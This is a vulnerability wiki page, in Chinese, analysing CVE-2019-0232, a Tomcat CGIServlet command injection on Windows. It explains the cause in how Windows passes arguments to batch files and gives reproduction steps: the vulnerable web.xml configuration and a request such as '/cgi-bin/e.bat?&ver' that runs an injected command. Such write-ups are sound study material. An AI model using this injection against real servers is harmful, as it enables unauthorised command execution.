<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Tomcat/%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-0232）Tomcat rce - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-0232\uff09Tomcat rce", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-1938）Apache Tomcat 文件包含漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/" class="btn btn-xs btn-link">
        （CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-0232tomcat-rce">（CVE-2019-0232）Tomcat rce<a class="headerlink" href="#cve-2019-0232tomcat-rce" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>该漏洞是由于Tomcat
CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。</p>
<p>该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Apache Tomcat 9.0.0.M1 to 9.0.17</p>
<p>Apache Tomcat 8.5.0 to 8.5.39</p>
<p>Apache Tomcat 7.0.0 to 7.0.93</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>漏洞相关的代码在
<code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code>
中，CGIServlet提供了一个cgi的调用接口，在启用 <code>enableCmdLineArguments</code>
参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的
<code>Runtime</code> 执行。 这个漏洞是因为 <code>Runtime.getRuntime().exec</code>
在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat：</p>
<div class="codehilite"><pre><span></span><code>rem arg.bat
echo %*
</code></pre></div>

<p>并执行如下的Java代码</p>
<div class="codehilite"><pre><span></span><code><span class="nv">String</span><span class="w"> </span>[]<span class="w"> </span><span class="nv">cmd</span><span class="o">=</span>{<span class="s2">&quot;arg.bat&quot;</span>,<span class="w"> </span><span class="s2">&quot;arg&quot;</span>,<span class="w"> </span><span class="s2">&quot;&amp;&quot;</span>,<span class="w"> </span><span class="s2">&quot;dir&quot;</span>}<span class="c1">;</span>
<span class="nv">Runtime</span>.<span class="nv">getRuntime</span><span class="ss">()</span>.<span class="k">exec</span><span class="ss">(</span><span class="nv">cmd</span><span class="ss">)</span><span class="c1">;</span>
</code></pre></div>

<p>在Windows下会输出 <code>arg</code> 和 <code>dir</code>
命令运行后的结果。同样的，用类似的脚本在Linux环境下测试：</p>
<div class="codehilite"><pre><span></span><code><span class="cp"># arg.sh</span>
<span class="k">for</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s">&quot;$@&quot;</span>
<span class="k">do</span>
<span class="w">    </span><span class="n">echo</span><span class="w"> </span><span class="err">&#39;</span><span class="n">$</span><span class="p">@</span><span class="err">&#39;</span><span class="w"> </span><span class="n">$key</span>
<span class="n">done</span>
<span class="n">String</span><span class="w"> </span><span class="p">[]</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;arg.sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;arg&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&amp;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;dir&quot;</span><span class="p">};</span>
<span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="n">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
</code></pre></div>

<p>此时的输出为</p>
<div class="codehilite"><pre><span></span><code>$@ arg
$@ &amp;
$@ dir
</code></pre></div>

<p>导致这种输出的原因是在JDK的实现中 <code>Runtime.getRuntime().exec</code> 实际调用了
<code>ProcessBuilder</code> ，而后 <code>ProcessBuilder</code> 调用 <code>ProcessImpl</code>使用系统调用
<code>vfork</code> ，把所有参数直接传递至 <code>execve</code>。</p>
<p>用 <code>strace -F -e vfork,execve java Main</code>
跟踪可以看到上面的Java代码在Linux中调用为</p>
<div class="codehilite"><pre><span></span><code><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;arg.sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;arg.sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;arg&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;dir&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="o">/*</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="n">vars</span><span class="w"> </span><span class="o">*/</span><span class="p">])</span>
</code></pre></div>

<p>而如果跟踪类似的PHP代码 <code>system('a.sh arg &amp; dir');</code> ，得到的结果为</p>
<div class="codehilite"><pre><span></span><code><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w">  </span><span class="p">[</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;a.sh arg &amp; dir&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="o">/*</span><span class="w"> </span><span class="mi">23</span><span class="w"> </span><span class="n">vars</span><span class="w"> </span><span class="o">*/</span><span class="p">])</span>
</code></pre></div>

<p>所以Java的 <code>Runtime.getRuntime().exec</code>
在CGI调用这种情况下很难有命令注入。而Windows中创建进程使用的是
<code>CreateProcess</code> ，会将参数合并成字符串，作为 <code>lpComandLine</code> 传入
<code>CreateProcess</code> 。程序启动后调用 <code>GetCommandLine</code> 获取参数，并调用
<code>CommandLineToArgvW</code> 传至 argv。在Windows中，当 <code>CreateProcess</code>
中的参数为 bat 文件或是 cmd 文件时，会调用 <code>cmd.exe</code> , 故最后会变成
<code>cmd.exe /c "arg.bat &amp; dir"</code>，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。</p>
<p>除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过，
例如 <code>dir "\"&amp;whoami"</code> 在Linux中是安全的，而在Windows会执行命令。</p>
<p>这是因为Windows在处理命令行参数时，会将 <code>"</code>
中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 <code>"</code> ，但是对 <code>\"</code>
的处理有误。同样用 <code>arg.bat</code> 做测试，可以发现这里只输出了 <code>\</code>
。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。</p>
<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>笔者使用的复现环境为9.0.12 + JRE 1.8.0。</p>
<p>首先进行CGI相关的配置，在 <code>conf/web.xml</code> 中启用CGIServlet：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;servlet&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>cgi<span class="nt">&lt;/servlet-name&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>org.apache.catalina.servlets.CGIServlet<span class="nt">&lt;/servlet-class&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">      </span><span class="nt">&lt;param-name&gt;</span>cgiPathPrefix<span class="nt">&lt;/param-name&gt;</span>
<span class="w">      </span><span class="nt">&lt;param-value&gt;</span>WEB-INF/cgi-bin<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">      </span><span class="nt">&lt;param-name&gt;</span>enableCmdLineArguments<span class="nt">&lt;/param-name&gt;</span>
<span class="w">      </span><span class="nt">&lt;param-value&gt;</span>true<span class="nt">&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;init-param&gt;</span>
<span class="w">      </span><span class="nt">&lt;param-name&gt;</span>executable<span class="nt">&lt;/param-name&gt;</span>
<span class="w">      </span><span class="nt">&lt;param-value&gt;&lt;/param-value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/init-param&gt;</span>
<span class="w">    </span><span class="nt">&lt;load-on-startup&gt;</span>5<span class="nt">&lt;/load-on-startup&gt;</span>
<span class="nt">&lt;/servlet&gt;</span>
</code></pre></div>

<p>这里主要的设置是 <code>enableCmdLineArguments</code> 和 <code>executable</code> 两个选项。
<code>enableCmdLineArguments</code> 启用后才会将Url中的参数传递到命令行，
<code>executable</code> 指定了执行的二进制文件，默认是
<code>perl</code>，需要置为空才会执行文件本身。</p>
<p>同样在 <code>conf/web.xml</code> 中启用cgi的servlet-mapping</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;servlet-mapping&gt;</span>
<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>cgi<span class="nt">&lt;/servlet-name&gt;</span>
<span class="w">    </span><span class="nt">&lt;url-pattern&gt;</span>/cgi-bin/*<span class="nt">&lt;/url-pattern&gt;</span>
<span class="nt">&lt;/servlet-mapping&gt;</span>
</code></pre></div>

<p>之后修改 <code>conf/context.xml</code> 的
<code>` 添加</code>privileged=\"true\"`属性，否则会没有权限</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;Context</span> <span class="na">privileged=</span><span class="s">&quot;true&quot;</span><span class="nt">&gt;</span>

<span class="w">    </span><span class="cm">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span>
<span class="w">    </span><span class="cm">&lt;!-- web application will be reloaded.                                   --&gt;</span>
<span class="w">    </span><span class="nt">&lt;WatchedResource&gt;</span>WEB-INF/web.xml<span class="nt">&lt;/WatchedResource&gt;</span>
<span class="w">    </span><span class="nt">&lt;WatchedResource&gt;</span>WEB-INF/tomcat-web.xml<span class="nt">&lt;/WatchedResource&gt;</span>
<span class="w">    </span><span class="nt">&lt;WatchedResource&gt;</span><span class="cp">${</span><span class="n">catalina</span><span class="o">.</span><span class="n">base</span><span class="cp">}</span>/conf/web.xml<span class="nt">&lt;/WatchedResource&gt;</span>

<span class="w">    </span><span class="cm">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span>
<span class="w">    </span><span class="cm">&lt;!--</span>
<span class="cm">    </span><span class="nt">&lt;Manager</span> <span class="na">pathname=</span><span class="s">&quot;&quot;</span> <span class="nt">/&gt;</span>
<span class="cm">    --&gt;</span>
<span class="nt">&lt;/Context&gt;</span>
</code></pre></div>

<p>然后在 <code>ROOT\WEB-INF</code> 下创建 <code>cgi-bin</code> 目录, 并在该目录下创建一个内容为
<code>echo Content-type: text/html</code> 的 <code>e.bat</code> 文件。</p>
<p>配置完成后，启动tomcat，访问 <code>http://0-sec.org:8080/cgi-bin/e.bat?&amp;ver</code>
，可以看到命令执行成功。</p>
<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/4875">https://xz.aliyun.com/t/4875</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-1938%EF%BC%89Apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-1938）Apache Tomcat 文件包含漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0221%EF%BC%89Apache%20Tomcat%20SSI%20printenv%E6%8C%87%E4%BB%A4%E4%B8%AD%E7%9A%84XSS/" class="btn btn-xs btn-link">
        （CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>